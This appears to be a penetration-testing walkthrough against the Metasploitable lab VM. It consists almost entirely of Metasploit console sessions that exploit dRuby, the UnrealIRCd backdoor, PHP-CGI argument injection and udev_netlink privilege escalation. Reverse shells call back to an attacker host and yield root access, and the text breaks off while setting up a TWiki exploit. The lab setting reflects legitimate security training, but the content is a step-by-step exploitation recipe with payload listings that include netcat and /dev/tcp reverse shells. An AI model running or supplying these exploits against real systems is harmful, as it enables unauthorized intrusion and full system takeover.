+   Name  Current Setting               Required  Description
+   ----  ---------------               --------  -----------
+   URI   druby://192.168.174.132:8787  yes       The dRuby URI of the target host (druby://host:port)
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(drb_remote_codeexec) > set LHOST 192.168.174.137
+LHOST => 192.168.174.137
+msf exploit(drb_remote_codeexec) > exploit 
+
+[*] trying to exploit instance_eval
+[*] Started reverse double handler
+[*] instance eval failed, trying to exploit syscall
+[-] Exploit failed: Errno::EINVAL Invalid argument
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo uIPQhkirEiHLO7wI;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "uIPQhkirEiHLO7wI\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.174.137:4444 -> 192.168.174.132:51077) at 2016-01-25 17:37:43 -0500
+
+id
+uid=0(root) gid=0(root)
+whoami
+root
+hostname
+metasploitable
+
+6.) Enumerating port - 6667/tcp - irc - Unreal ircd
+                       6697/tcp - irc - Unreal ircd
+In msf
+msf > search Unreal
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                        Disclosure Date  Rank       Description
+   ----                                        ---------------  ----       -----------
+   exploit/linux/games/ut2004_secure           2004-06-18       good       Unreal Tournament 2004 "secure" Overflow (Linux)
+   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution
+   exploit/windows/games/ut2004_secure         2004-06-18       good       Unreal Tournament 2004 "secure" Overflow (Win32)
+
+
+msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf exploit(unreal_ircd_3281_backdoor) > show options 
+
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  6667             yes       The target port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.174.132
+RHOST => 192.168.174.132
+msf exploit(unreal_ircd_3281_backdoor) > show payloads 
+
+Compatible Payloads
+===================
+
+   Name                                Disclosure Date  Rank    Description
+   ----                                ---------------  ----    -----------
+   cmd/unix/bind_perl                                   normal  Unix Command Shell, Bind TCP (via Perl)
+   cmd/unix/bind_perl_ipv6                              normal  Unix Command Shell, Bind TCP (via perl) IPv6
+   cmd/unix/bind_ruby                                   normal  Unix Command Shell, Bind TCP (via Ruby)
+   cmd/unix/bind_ruby_ipv6                              normal  Unix Command Shell, Bind TCP (via Ruby) IPv6
+   cmd/unix/generic                                     normal  Unix Command, Generic Command Execution
+   cmd/unix/reverse                                     normal  Unix Command Shell, Double Reverse TCP (telnet)
+   cmd/unix/reverse_perl                                normal  Unix Command Shell, Reverse TCP (via Perl)
+   cmd/unix/reverse_perl_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via perl)
+   cmd/unix/reverse_ruby                                normal  Unix Command Shell, Reverse TCP (via Ruby)
+   cmd/unix/reverse_ruby_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via Ruby)
+   cmd/unix/reverse_ssl_double_telnet                   normal  Unix Command Shell, Double Reverse TCP SSL (telnet)
+
+msf exploit(unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf exploit(unreal_ircd_3281_backdoor) > show options 
+
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  192.168.174.132  yes       The target address
+   RPORT  6667             yes       The target port
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf exploit(unreal_ircd_3281_backdoor) > set LHOST 192.168.174.137
+LHOST => 192.168.174.137
+msf exploit(unreal_ircd_3281_backdoor) > exploit 
+
+[*] Started reverse double handler
+[*] Connected to 192.168.174.132:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+[*] Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo cIst0BJoT0yeIa8b;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "cIst0BJoT0yeIa8b\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.174.137:4444 -> 192.168.174.132:35598) at 2016-01-25 17:43:30 -0500
+
+id
+uid=0(root) gid=0(root)
+whoami
+root
+pwd
+/etc/unreal
+hostname
+metasploitable
+
+7.) Enumerating port - 80/tcp - http - Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+In Browser
+http://192.168.174.132/phpinfo
+https://www.praetorian.com/blog/php-cgi-remote-command-execution-vulnerability-exploitation
+In msf
+msf > search cgi
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                                                  Disclosure Date  Rank       Description
+   ----                                                                  ---------------  ----       -----------
+   auxiliary/admin/http/cfme_manageiq_evm_pass_reset                     2013-11-12       normal     Red Hat CloudForms Management Engine 5.1 miq_policy/explorer SQL Injection
+   auxiliary/admin/http/foreman_openstack_satellite_priv_esc             2013-06-06       normal     Foreman (Red Hat OpenStack/Satellite) users/create Mass Assignment
+   auxiliary/admin/http/jboss_bshdeployer                                                 normal     JBoss JMX Console Beanshell Deployer WAR Upload and Deployment
+   auxiliary/admin/http/jboss_deploymentfilerepository                                    normal     JBoss JMX Console DeploymentFileRepository WAR Upload and Deployment
+   auxiliary/admin/http/katello_satellite_priv_esc                       2014-03-24       normal     Katello (Red Hat Satellite) users/update_roles Missing Authorization
+   auxiliary/admin/http/sophos_wpa_traversal                             2013-04-03       normal     Sophos Web Protection Appliance patience.cgi Directory Traversal
+   auxiliary/admin/http/zyxel_admin_password_extractor                                    normal     ZyXEL GS1510-16 Password Extractor
+   auxiliary/admin/webmin/edit_html_fileaccess                           2012-09-06       normal     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+   auxiliary/dos/http/apache_mod_isapi                                   2010-03-05       normal     Apache mod_isapi Dangling Pointer
+   auxiliary/dos/ntp/ntpd_reserved_dos                                   2009-10-04       normal     NTP.org ntpd Reserved Mode Denial of Service
+   auxiliary/dos/syslog/rsyslog_long_tag                                 2011-09-01       normal     rsyslog Long Tag Off-By-Two DoS
+   auxiliary/dos/wireshark/chunked                                       2007-02-22       normal     Wireshark chunked_encoding_dissector Function DOS
+   auxiliary/dos/wireshark/cldap                                         2011-03-01       normal     Wireshark CLDAP Dissector DOS
+   auxiliary/scanner/couchdb/couchdb_enum                                                 normal     CouchDB Enum Utility
+   auxiliary/scanner/http/apache_mod_cgi_bash_env                        2014-09-24       normal     Apache mod_cgi Bash Environment Variable RCE Scanner
+   auxiliary/scanner/http/dlink_dir_session_cgi_http_login                                normal     D-Link DIR-300B / DIR-600B / DIR-815 / DIR-645 HTTP Login Utility
+   auxiliary/scanner/http/mediawiki_svg_fileaccess                                        normal     MediaWiki SVG XML Entity Expansion Remote File Access
+   auxiliary/scanner/http/smt_ipmi_cgi_scanner                           2013-11-06       normal     Supermicro Onboard IPMI CGI Vulnerability Scanner
+   auxiliary/scanner/http/smt_ipmi_url_redirect_traversal                2013-11-06       normal     Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal
+   auxiliary/scanner/http/web_vulndb                                                      normal     HTTP Vuln Scanner
+   auxiliary/scanner/http/yaws_traversal                                 2011-11-25       normal     Yaws Web Server Directory Traversal
+   auxiliary/server/wget_symlink_file_write                              2014-10-27       normal     GNU Wget FTP Symlink Arbitrary Filesystem Access
+   exploit/bsdi/softcart/mercantec_softcart                              2004-08-19       great      Mercantec SoftCart CGI Overflow
+   exploit/linux/ftp/proftp_sreplace                                     2006-11-26       great      ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
+   exploit/linux/http/alcatel_omnipcx_mastercgi_exec                     2007-09-09       manual     Alcatel-Lucent OmniPCX Enterprise masterCGI Arbitrary Command Execution
+   exploit/linux/http/cfme_manageiq_evm_upload_exec                      2013-09-04       normal     Red Hat CloudForms Management Engine 5.1 agent/linuxpkgs Path Traversal
+   exploit/linux/http/ddwrt_cgibin_exec                                  2009-07-20       excellent  DD-WRT HTTP Daemon Arbitrary Command Execution
+   exploit/linux/http/dlink_authentication_cgi_bof                       2013-02-08       normal     D-Link authentication.cgi Buffer Overflow
+   exploit/linux/http/dlink_dspw215_info_cgi_bof                         2014-05-22       normal     D-Link info.cgi POST Request Buffer Overflow
+   exploit/linux/http/dlink_hedwig_cgi_bof                               2013-02-08       normal     D-Link hedwig.cgi Buffer Overflow in Cookie Header
+   exploit/linux/http/esva_exec                                          2012-08-16       excellent  E-Mail Security Virtual Appliance learn-msg.cgi Command Injection
+   exploit/linux/http/foreman_openstack_satellite_code_exec              2013-06-06       normal     Foreman (Red Hat OpenStack/Satellite) bookmarks/create Code Injection
+   exploit/linux/http/groundwork_monarch_cmd_exec                        2013-03-08       excellent  GroundWork monarch_scan.cgi OS Command Injection
+   exploit/linux/http/linksys_apply_cgi                                  2005-09-13       great      Linksys WRT54 Access Point apply.cgi Buffer Overflow
+   exploit/linux/http/linksys_e1500_apply_exec                           2013-02-05       excellent  Linksys E1500/E2500 apply.cgi Remote Command Injection
+   exploit/linux/http/linksys_wrt160nv2_apply_exec                       2013-02-11       excellent  Linksys WRT160nv2 apply.cgi Remote Command Injection
+   exploit/linux/http/linksys_wrt54gl_apply_exec                         2013-01-18       manual     Linksys WRT54GL apply.cgi Command Execution
+   exploit/linux/http/netgear_dgn1000b_setup_exec                        2013-02-06       excellent  Netgear DGN1000B setup.cgi Remote Command Execution
+   exploit/linux/http/netgear_dgn2200b_pppoe_exec                        2013-02-15       manual     Netgear DGN2200B pppoe.cgi Remote Command Execution
+   exploit/linux/http/raidsonic_nas_ib5220_exec_noauth                   2013-02-04       manual     Raidsonic NAS Devices Unauthenticated Remote Command Execution
+   exploit/linux/http/smt_ipmi_close_window_bof                          2013-11-06       good       Supermicro Onboard IPMI close_window.cgi Buffer Overflow
+   exploit/linux/http/synology_dsm_sliceupload_exec_noauth               2013-10-31       excellent  Synology DiskStation Manager SLICEUPLOAD Remote Command Execution
+   exploit/linux/http/zen_load_balancer_exec                             2012-09-14       excellent  ZEN Load Balancer Filelog Command Execution
+   exploit/linux/misc/hplip_hpssd_exec                                   2007-10-04       excellent  HPLIP hpssd.py From Address Arbitrary Command Execution
+   exploit/linux/misc/lprng_format_string                                2000-09-25       normal     LPRng use_syslog Remote Format String Vulnerability
+   exploit/multi/browser/firefox_escape_retval                           2009-07-13       normal     Firefox 3.5 escape() Return Value Memory Corruption
+   exploit/multi/browser/firefox_proto_crmfrequest                       2013-08-06       excellent  Firefox 5.0 - 15.0.1 __exposedProps__ XCS Code Execution
+   exploit/multi/browser/firefox_svg_plugin                              2013-01-08       excellent  Firefox 17.0.1 Flash Privileged Code Injection
+   exploit/multi/browser/java_atomicreferencearray                       2012-02-14       excellent  Java AtomicReferenceArray Type Violation Vulnerability
+   exploit/multi/browser/java_jre17_exec                                 2012-08-26       excellent  Java 7 Applet Remote Code Execution
+   exploit/multi/browser/java_jre17_glassfish_averagerangestatisticimpl  2012-10-16       excellent  Java Applet AverageRangeStatisticImpl Remote Code Execution
+   exploit/multi/browser/java_verifier_field_access                      2012-06-06       excellent  Java Applet Field Bytecode Verifier Cache Remote Code Execution
+   exploit/multi/http/apache_mod_cgi_bash_env_exec                       2014-09-24       good       Apache mod_cgi Bash Environment Variable Code Injection
+   exploit/multi/http/jboss_bshdeployer                                  2010-04-26       excellent  JBoss JMX Console Beanshell Deployer WAR Upload and Deployment
+   exploit/multi/http/jboss_deploymentfilerepository                     2010-04-26       excellent  JBoss Java Class DeploymentFileRepository WAR Deployment
+   exploit/multi/http/jboss_maindeployer                                 2007-02-20       excellent  JBoss JMX Console Deployer Upload and Execute
+   exploit/multi/http/mediawiki_thumb                                    2014-01-28       excellent  MediaWiki Thumb.php Remote Command Execution
+   exploit/multi/http/movabletype_upgrade_exec                           2013-01-07       normal     Movable Type 4.2x, 4.3x Web Upgrade Remote Code Execution
+   exploit/multi/http/php_cgi_arg_injection                              2012-05-03       excellent  PHP CGI Argument Injection
+   exploit/multi/vpn/tincd_bof                                           2013-04-22       average    Tincd Post-Authentication Remote TCP Stack Buffer Overflow
+   exploit/osx/browser/mozilla_mchannel                                  2011-05-10       normal     Mozilla Firefox 3.6.16 mChannel Use-After-Free
+   exploit/unix/http/vmturbo_vmtadmin_exec_noauth                        2014-06-25       excellent  VMTurbo Operations Manager vmtadmin.cgi Remote Command Execution
+   exploit/unix/smtp/exim4_string_format                                 2010-12-07       excellent  Exim4 string_format Function Heap Buffer Overflow
+   exploit/unix/webapp/awstats_configdir_exec                            2005-01-15       excellent  AWStats configdir Remote Command Execution
+   exploit/unix/webapp/awstats_migrate_exec                              2006-05-04       excellent  AWStats migrate Remote Command Execution
+   exploit/unix/webapp/generic_exec                                      1993-11-14       excellent  Generic Web Application Unix Command Execution
+   exploit/unix/webapp/guestbook_ssi_exec                                1999-11-05       excellent  Matt Wright guestbook.pl Arbitrary Command Execution
+   exploit/unix/webapp/horde_unserialize_exec                            2013-06-27       excellent  Horde Framework Unserialize PHP Code Execution
+   exploit/unix/webapp/nagios3_history_cgi                               2012-12-09       great      Nagios3 history.cgi Host Command Execution
+   exploit/unix/webapp/nagios3_statuswml_ping                            2009-06-22       excellent  Nagios3 statuswml.cgi Ping Command Execution
+   exploit/unix/webapp/openview_connectednodes_exec                      2005-08-25       excellent  HP Openview connectedNodes.ovpl Remote Command Execution
+   exploit/unix/webapp/qtss_parse_xml_exec                               2003-02-24       excellent  QuickTime Streaming Server parse_xml.cgi Remote Execution
+   exploit/unix/webapp/twiki_history                                     2005-09-14       excellent  TWiki History TWikiUsers rev Parameter Command Execution
+   exploit/unix/webapp/twiki_maketext                                    2012-12-15       excellent  TWiki MAKETEXT Remote Command Execution
+   exploit/unix/webapp/twiki_search                                      2004-10-01       excellent  TWiki Search Function Arbitrary Command Execution
+   exploit/unix/webapp/webmin_show_cgi_exec                              2012-09-06       excellent  Webmin /file/show.cgi Remote Command Execution
+   exploit/unix/webapp/zeroshell_exec                                    2013-09-22       excellent  ZeroShell Remote Code Execution
+   exploit/windows/browser/mozilla_attribchildremoved                    2011-12-06       average    Firefox 8/9 AttributeChildRemoved() Use-After-Free
+   exploit/windows/browser/mozilla_firefox_onreadystatechange            2013-06-25       normal     Firefox onreadystatechange Event DocumentViewerImpl Use After Free
+   exploit/windows/browser/mozilla_firefox_xmlserializer                 2013-01-08       normal     Firefox XMLSerializer Use After Free
+   exploit/windows/browser/mozilla_interleaved_write                     2010-10-25       normal     Mozilla Firefox Interleaved document.write/appendChild Memory Corruption
+   exploit/windows/browser/mozilla_mchannel                              2011-05-10       normal     Mozilla Firefox 3.6.16 mChannel Use-After-Free Vulnerability
+   exploit/windows/browser/mozilla_nssvgvalue                            2011-12-06       average    Firefox nsSVGValue Out-of-Bounds Access Vulnerability
+   exploit/windows/browser/mozilla_nstreerange                           2011-02-02       normal     Mozilla Firefox "nsTreeRange" Dangling Pointer Vulnerability
+   exploit/windows/browser/mozilla_reduceright                           2011-06-21       normal     Mozilla Firefox Array.reduceRight() Integer Overflow
+   exploit/windows/browser/trendmicro_officescan                         2007-02-12       normal     Trend Micro OfficeScan Client ActiveX Control Buffer Overflow
+   exploit/windows/fileformat/csound_getnum_bof                          2012-02-23       normal     Csound hetro File Handling Stack Buffer Overflow
+   exploit/windows/fileformat/vlc_modplug_s3m                            2011-04-07       average    VideoLAN VLC ModPlug ReadS3M Stack Buffer Overflow
+   exploit/windows/fileformat/wireshark_mpeg_overflow                    2014-03-20       good       Wireshark wiretap/mpeg.c Stack Buffer Overflow
+   exploit/windows/fileformat/wireshark_packet_dect                      2011-04-18       good       Wireshark packet-dect.c Stack Buffer Overflow (local)
+   exploit/windows/http/hp_nnm_getnnmdata_hostname                       2010-05-11       great      HP OpenView Network Node Manager getnnmdata.exe (Hostname) CGI Buffer Overflow
+   exploit/windows/http/hp_nnm_getnnmdata_icount                         2010-05-11       great      HP OpenView Network Node Manager getnnmdata.exe (ICount) CGI Buffer Overflow
+   exploit/windows/http/hp_nnm_getnnmdata_maxage                         2010-05-11       great      HP OpenView Network Node Manager getnnmdata.exe (MaxAge) CGI Buffer Overflow
+   exploit/windows/http/hp_nnm_nnmrptconfig_schdparams                   2011-01-10       normal     HP OpenView NNM nnmRptConfig.exe schdParams Buffer Overflow
+   exploit/windows/http/hp_nnm_openview5                                 2007-12-06       great      HP OpenView Network Node Manager OpenView5.exe CGI Buffer Overflow
+   exploit/windows/http/hp_nnm_ovalarm_lang                              2009-12-09       great      HP OpenView Network Node Manager ovalarm.exe CGI Buffer Overflow
+   exploit/windows/http/hp_nnm_ovbuildpath_textfile                      2011-11-01       normal     HP OpenView Network Node Manager ov.dll _OVBuildPath Buffer Overflow
+   exploit/windows/http/hp_nnm_ovwebhelp                                 2009-12-09       great      HP OpenView Network Node Manager OvWebHelp.exe CGI Buffer Overflow
+   exploit/windows/http/hp_nnm_ovwebsnmpsrv_main                         2010-06-16       great      HP OpenView Network Node Manager ovwebsnmpsrv.exe main Buffer Overflow
+   exploit/windows/http/hp_nnm_ovwebsnmpsrv_ovutil                       2010-06-16       great      HP OpenView Network Node Manager ovwebsnmpsrv.exe ovutil Buffer Overflow
+   exploit/windows/http/hp_nnm_ovwebsnmpsrv_uro                          2010-06-08       great      HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow
+   exploit/windows/http/hp_nnm_snmp                                      2009-12-09       great      HP OpenView Network Node Manager Snmp.exe CGI Buffer Overflow
+   exploit/windows/http/hp_nnm_snmpviewer_actapp                         2010-05-11       great      HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow
+   exploit/windows/http/hp_nnm_toolbar_01                                2009-01-07       great      HP OpenView Network Node Manager Toolbar.exe CGI Buffer Overflow
+   exploit/windows/http/hp_nnm_toolbar_02                                2009-01-21       normal     HP OpenView Network Node Manager Toolbar.exe CGI Cookie Handling Buffer Overflow
+   exploit/windows/http/hp_nnm_webappmon_execvp                          2010-07-20       great      HP OpenView Network Node Manager execvp_nc Buffer Overflow
+   exploit/windows/http/hp_nnm_webappmon_ovjavalocale                    2010-08-03       great      HP NNM CGI webappmon.exe OvJavaLocale Buffer Overflow
+   exploit/windows/http/ipswitch_wug_maincfgret                          2004-08-25       great      Ipswitch WhatsUp Gold 8.03 Buffer Overflow
+   exploit/windows/http/mdaemon_worldclient_form2raw                     2003-12-29       great      MDaemon WorldClient form2raw.cgi Stack Buffer Overflow
+   exploit/windows/http/php_apache_request_headers_bof                   2012-05-08       normal     PHP apache_request_headers Function Buffer Overflow
+   exploit/windows/http/trendmicro_officescan                            2007-06-28       good       Trend Micro OfficeScan Remote Stack Buffer Overflow
+   exploit/windows/iis/ms01_026_dbldecode                                2001-05-15       excellent  MS01-026 Microsoft IIS/PWS CGI Filename Double Decode Command Execution
+   exploit/windows/misc/wireshark_lua                                    2011-07-18       excellent  Wireshark console.lua Pre-Loading Script Execution
+   exploit/windows/misc/wireshark_packet_dect                            2011-04-18       good       Wireshark packet-dect.c Stack Buffer Overflow
+   post/multi/escalate/cups_root_file_read                               2012-11-20       normal     CUPS 1.6.1 Root File Read
+
+
+msf > use exploit/multi/http/php_cgi_arg_injection
+msf exploit(php_cgi_arg_injection) > show options 
+
+Module options (exploit/multi/http/php_cgi_arg_injection):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   PLESK        false            yes       Exploit Plesk
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                         yes       The target address
+   RPORT        80               yes       The target port
+   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
+   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
+   VHOST                         no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(php_cgi_arg_injection) > set RHOST 192.168.174.132
+RHOST => 192.168.174.132
+msf exploit(php_cgi_arg_injection) > show payloads 
+
+Compatible Payloads
+===================
+
+   Name                           Disclosure Date  Rank    Description
+   ----                           ---------------  ----    -----------
+   generic/custom                                  normal  Custom Payload
+   generic/shell_bind_tcp                          normal  Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                       normal  Generic Command Shell, Reverse TCP Inline
+   php/bind_perl                                   normal  PHP Command Shell, Bind TCP (via Perl)
+   php/bind_perl_ipv6                              normal  PHP Command Shell, Bind TCP (via perl) IPv6
+   php/bind_php                                    normal  PHP Command Shell, Bind TCP (via PHP)
+   php/bind_php_ipv6                               normal  PHP Command Shell, Bind TCP (via php) IPv6
+   php/download_exec                               normal  PHP Executable Download and Execute
+   php/exec                                        normal  PHP Execute Command 
+   php/meterpreter/bind_tcp                        normal  PHP Meterpreter, Bind TCP Stager
+   php/meterpreter/bind_tcp_ipv6                   normal  PHP Meterpreter, Bind TCP Stager IPv6
+   php/meterpreter/reverse_tcp                     normal  PHP Meterpreter, PHP Reverse TCP Stager
+   php/meterpreter_reverse_tcp                     normal  PHP Meterpreter, Reverse TCP Inline
+   php/reverse_perl                                normal  PHP Command, Double Reverse TCP Connection (via Perl)
+   php/reverse_php                                 normal  PHP Command Shell, Reverse TCP (via PHP)
+
+msf exploit(php_cgi_arg_injection) > set payload php/meterpreter_reverse_tcp
+payload => php/meterpreter_reverse_tcp
+msf exploit(php_cgi_arg_injection) > show options 
+
+Module options (exploit/multi/http/php_cgi_arg_injection):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   PLESK        false            yes       Exploit Plesk
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST        192.168.174.132  yes       The target address
+   RPORT        80               yes       The target port
+   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
+   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
+   VHOST                         no        HTTP server virtual host
+
+
+Payload options (php/meterpreter_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(php_cgi_arg_injection) > set LHOST 192.168.174.137
+LHOST => 192.168.174.137
+msf exploit(php_cgi_arg_injection) > exploit 
+
+[*] Started reverse handler on 192.168.174.137:4444 
+[*] Meterpreter session 1 opened (192.168.174.137:4444 -> 192.168.174.132:54999) at 2016-01-25 18:07:46 -0500
+
+meterpreter > getuid 
+Server username: www-data (33)
+meterpreter > shell
+Process 5613 created.
+Channel 0 created.
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+exit
+meterpreter > background 
+[*] Backgrounding session 1...
+msf exploit(php_cgi_arg_injection) > back
+msf > use exploit/linux/local/udev_netlink 
+msf exploit(udev_netlink) > show options 
+
+Module options (exploit/linux/local/udev_netlink):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   NetlinkPID                    no        Usually udevd pid-1.  Meterpreter sessions will autodetect
+   SESSION                       yes       The session to run this module on.
+   WritableDir  /tmp             yes       A directory where we can write files (must not be mounted noexec)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+msf exploit(udev_netlink) > sessions -i
+
+Active sessions
+===============
+
+  Id  Type                 Information                     Connection
+  --  ----                 -----------                     ----------
+  1   meterpreter php/php  www-data (33) @ metasploitable  192.168.174.137:4444 -> 192.168.174.132:54999 (192.168.174.132)
+
+msf exploit(udev_netlink) > set SESSION 1
+SESSION => 1
+msf exploit(udev_netlink) > exploit 
+
+[*] Started reverse handler on 192.168.174.137:4444 
+[*] Attempting to autodetect netlink pid...
+[*] Meterpreter session, using get_processes to find netlink pid
+[*] udev pid: 2719
+[+] Found netlink pid: 2718
+[*] Writing payload executable (274 bytes) to /tmp/BUpxlVbvGu
+[*] Writing exploit executable (1879 bytes) to /tmp/uvMfuDFaUQ
+[*] chmod'ing and running it...
+[*] Command shell session 2 opened (192.168.174.137:4444 -> 192.168.174.132:39894) at 2016-01-25 18:09:58 -0500
+
+id
+uid=0(root) gid=0(root)
+whoami
+root
+hostname
+metasploitable
+
+In Browser
+http://192.168.174.132/twiki/
+
+In msf
+msf > search twiki
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                    Disclosure Date  Rank       Description
+   ----                                    ---------------  ----       -----------
+   exploit/unix/webapp/moinmoin_twikidraw  2012-12-30       manual     MoinMoin twikidraw Action Traversal File Upload
+   exploit/unix/webapp/twiki_history       2005-09-14       excellent  TWiki History TWikiUsers rev Parameter Command Execution
+   exploit/unix/webapp/twiki_maketext      2012-12-15       excellent  TWiki MAKETEXT Remote Command Execution
+   exploit/unix/webapp/twiki_search        2004-10-01       excellent  TWiki Search Function Arbitrary Command Execution
+
+
+msf > use exploit/unix/webapp/twiki_history
+msf exploit(twiki_history) > show options 
+
+Module options (exploit/unix/webapp/twiki_history):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                     yes       The target address
+   RPORT    80               yes       The target port
+   URI      /twiki/bin       yes       TWiki bin directory path
+   VHOST                     no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(twiki_history) > set RHOST 192.168.174.132
+RHOST => 192.168.174.132
+msf exploit(twiki_history) > show payloads 
+
+Compatible Payloads
+===================
+
+   Name                                Disclosure Date  Rank    Description
+   ----                                ---------------  ----    -----------
+   cmd/unix/bind_awk                                    normal  Unix Command Shell, Bind TCP (via AWK)
+   cmd/unix/bind_inetd                                  normal  Unix Command Shell, Bind TCP (inetd)
+   cmd/unix/bind_lua                                    normal  Unix Command Shell, Bind TCP (via Lua)
+   cmd/unix/bind_netcat                                 normal  Unix Command Shell, Bind TCP (via netcat)
+   cmd/unix/bind_netcat_gaping                          normal  Unix Command Shell, Bind TCP (via netcat -e)
+   cmd/unix/bind_netcat_gaping_ipv6                     normal  Unix Command Shell, Bind TCP (via netcat -e) IPv6
+   cmd/unix/bind_perl                                   normal  Unix Command Shell, Bind TCP (via Perl)
+   cmd/unix/bind_perl_ipv6                              normal  Unix Command Shell, Bind TCP (via perl) IPv6
+   cmd/unix/bind_ruby                                   normal  Unix Command Shell, Bind TCP (via Ruby)
+   cmd/unix/bind_ruby_ipv6                              normal  Unix Command Shell, Bind TCP (via Ruby) IPv6
+   cmd/unix/bind_zsh                                    normal  Unix Command Shell, Bind TCP (via Zsh)
+   cmd/unix/generic                                     normal  Unix Command, Generic Command Execution
+   cmd/unix/reverse                                     normal  Unix Command Shell, Double Reverse TCP (telnet)
+   cmd/unix/reverse_awk                                 normal  Unix Command Shell, Reverse TCP (via AWK)
+   cmd/unix/reverse_bash                                normal  Unix Command Shell, Reverse TCP (/dev/tcp)
+   cmd/unix/reverse_bash_telnet_ssl                     normal  Unix Command Shell, Reverse TCP SSL (telnet)
+   cmd/unix/reverse_lua                                 normal  Unix Command Shell, Reverse TCP (via Lua)
+   cmd/unix/reverse_netcat                              normal  Unix Command Shell, Reverse TCP (via netcat)
+   cmd/unix/reverse_netcat_gaping                       normal  Unix Command Shell, Reverse TCP (via netcat -e)
+   cmd/unix/reverse_openssl                             normal  Unix Command Shell, Double Reverse TCP SSL (openssl)
+   cmd/unix/reverse_perl                                normal  Unix Command Shell, Reverse TCP (via Perl)
+   cmd/unix/reverse_perl_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via perl)
+   cmd/unix/reverse_php_ssl                             normal  Unix Command Shell, Reverse TCP SSL (via php)
+   cmd/unix/reverse_python                              normal  Unix Command Shell, Reverse TCP (via Python)
+   cmd/unix/reverse_python_ssl                          normal  Unix Command Shell, Reverse TCP SSL (via python)
+   cmd/unix/reverse_ruby                                normal  Unix Command Shell, Reverse TCP (via Ruby)
+   cmd/unix/reverse_ruby_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via Ruby)
+   cmd/unix/reverse_ssl_double_telnet                   normal  Unix Command Shell, Double Reverse TCP SSL (telnet)
+   cmd/unix/reverse_zsh                                 normal  Unix Command Shell, Reverse TCP (via Zsh)
+   generic/custom                                       normal  Custom Payload
+   generic/shell_bind_tcp                               normal  Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                            normal  Generic Command Shell, Reverse TCP Inline
+
+msf exploit(twiki_history) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf exploit(twiki_history) > show options 
+
+Module options (exploit/unix/webapp/twiki_history):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST    192.168.174.132  yes       The target address
+   RPORT    80               yes       The target port
+   URI      /twiki/bin       yes       TWiki bin directory path
